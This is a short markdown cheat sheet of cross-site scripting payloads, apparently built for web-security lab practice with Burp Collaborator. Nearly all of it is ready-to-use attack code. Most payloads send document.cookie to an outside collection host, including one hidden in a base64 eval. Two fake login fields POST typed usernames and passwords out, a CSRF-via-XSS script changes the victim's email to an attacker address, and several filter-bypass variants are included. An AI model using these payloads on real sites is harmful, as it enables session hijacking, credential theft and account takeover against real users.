# XSS Payloads

## Cookie Stealers

### Basic Cookie Stealer
```html
<script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

### Image-Based
```html
<script>document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</script>
```

### Fetch-Based
```javascript
<script>fetch('http://burp.oastify.com?c='+btoa(document.cookie))</script>
```

## Context-Specific Payloads

### Breaking Out of Select Tag
```javascript
"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

### AngularJS Expression
```javascript
{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
```

### Reflected DOM XSS
```javascript
\\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
```

### Stored DOM (First Bracket Bypass)
```html
<><img src=1 onerror="window.location='http://burp.oastify.com/?c='+document.cookie">
```

## Password Capture

### Basic Form
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('http://burp.oastify.com',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
});">
```

### With Autocomplete
```html
<input name="username" id="username" autocomplete="username">
<input type="password" id="password" name="password" autocomplete="password" 
  onchange="if(this.value.length)fetch('http://burp.oastify.com',{
    method:'POST',
    mode: 'no-cors',
    body:username.value+':'+this.value
  });">
```

## CSRF via XSS

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();

function handleResponse() {
  var token = this.responseText.match(/name=\"csrf\" value=\"(\w+)\"/)[1];
  var changeReq = new XMLHttpRequest();
  changeReq.open('post', '/my-account/change-email', true);
  changeReq.send('csrf='+token+'&email=attacker@evil.com');
}
</script>
```

## Bypass Techniques

### Case Variation
```html
</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt >
```

### Bracket Notation
```javascript
"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"
```

### Base64 Eval
```javascript
"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```

## Quick Reference

Replace `burp.oastify.com` with your Burp Collaborator URL!
